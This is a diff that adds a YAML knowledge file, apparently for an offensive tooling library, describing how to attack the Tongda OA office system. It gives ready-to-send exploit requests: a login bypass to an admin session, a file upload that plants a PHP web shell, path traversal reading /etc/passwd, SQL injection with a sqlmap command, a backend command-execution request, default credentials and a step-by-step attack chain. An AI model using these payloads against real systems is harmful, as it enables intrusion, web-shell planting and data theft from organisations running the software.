@@ -1,0 +1,155 @@
+name: 通达OA攻击
+description: 通达OA系统漏洞利用 - 任意用户登录、文件上传、RCE、SQL注入
+domain: oa
+version: '3.0'
+tags:
+- oa
+- tongda
+- enterprise
+- rce
+
+knowledge: |
+  # 通达OA攻击
+
+  ## 攻击思路
+  ```
+  系统识别 → 版本枚举 → 漏洞探测 → 认证绕过/RCE → 权限提升
+  ```
+
+  ## 系统识别
+
+  | 特征 | 值 |
+  |------|-----|
+  | Title | 通达OA |
+  | 路径 | /tongda/, /mobile/, /general/ |
+  | Cookie | PHPSESSID |
+
+  ```bash
+  # 识别
+  curl http://target/ | grep -i "tongda\|通达"
+  curl http://target/general/
+  ```
+
+  ## 版本特征
+
+  | 版本 | 特征路径 |
+  |------|----------|
+  | 2013 | /general/ |
+  | 2015 | /mobile/ |
+  | 2017 | /ispirit/ |
+  | V11 | /appbuilder/ |
+
+  ## 关键漏洞矩阵
+
+  | 漏洞类型 | 路径 | 版本 |
+  |----------|------|------|
+  | 任意用户登录 | /logincheck.php | V11 |
+  | 文件上传RCE | /ispirit/im/upload.php | 2017/V11 |
+  | 任意文件读取 | /ispirit/interface/gateway.php | 2017 |
+  | SQL注入 | /general/reportshop/ | 全版本 |
+  | 后台RCE | /appbuilder/ | V11 |
+
+  ## 任意用户登录攻击
+
+  ### CVE-2021-25251
+  ```bash
+  # 获取Session
+  GET /logincheck_code.php
+
+  # 伪造登录
+  POST /logincheck.php
+  UNAME=admin&PASSWORD=&encode_type=1
+
+  # 成功后获取管理员Session
+  ```
+
+  ## 文件上传RCE
+
+  ```bash
+  # CVE漏洞点: /ispirit/im/upload.php
+  POST /ispirit/im/upload.php
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="P"
+
+  1
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="DEST_UID"
+
+  1
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="UPLOAD_MODE"
+
+  2
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="ATTACHMENT"; filename="shell.php"
+  Content-Type: application/octet-stream
+
+  <?php system($_GET['c']);?>
+  ------WebKitFormBoundary--
+
+  # 上传路径
+  /attach/im/shell.php
+  ```
+
+  ## 任意文件读取
+
+  ```bash
+  # 漏洞点: /ispirit/interface/gateway.php
+  POST /ispirit/interface/gateway.php
+  Content-Type: application/x-www-form-urlencoded
+
+  json={"url":"/general/../../../../../etc/passwd"}
+
+  # Windows
+  json={"url":"/general/../../../../../windows/win.ini"}
+  ```
+
+  ## SQL注入攻击
+
+  ```bash
+  # 注入点: /general/reportshop/utils/get_datas.php
+  GET /general/reportshop/utils/get_datas.php?pid=1 UNION SELECT user(),2,3-- -
+
+  # sqlmap
+  sqlmap -u "http://target/general/reportshop/utils/get_datas.php?pid=1" --dbms=mysql --batch
+  ```
+
+  ## 后台RCE
+
+  ```bash
+  # V11版本
+  POST /general/appbuilder/modules/portal/components/AppTplShow/run.php
+  act=cmd&cmd=id
+
+  # 或通过其他接口
+  GET /general/appbuilder/web/portal/gateway/getkeep?activeTab=1&id=cmd
+  ```
+
+  ## 默认凭证
+
+  | 账户 | 密码 |
+  |------|------|
+  | admin | 空/tongda |
+  | system | system |
+
+  ## 敏感信息泄露
+
+  | 文件 | 路径 |
+  |------|------|
+  | 配置文件 | /inc/conn.php |
+  | 数据库配置 | /inc/oa_config.php |
+  | 日志文件 | /logs/ |
+
+  ## 完整攻击链
+
+  ```
+  1. 访问系统识别版本
+  2. 尝试默认凭证
+  3. 尝试任意用户登录绕过
+  4. 利用文件上传获取WebShell
+  5. 或利用任意文件读取获取配置
+  6. SQL注入提取数据
+  7. 后台RCE获取系统权限
+  ```
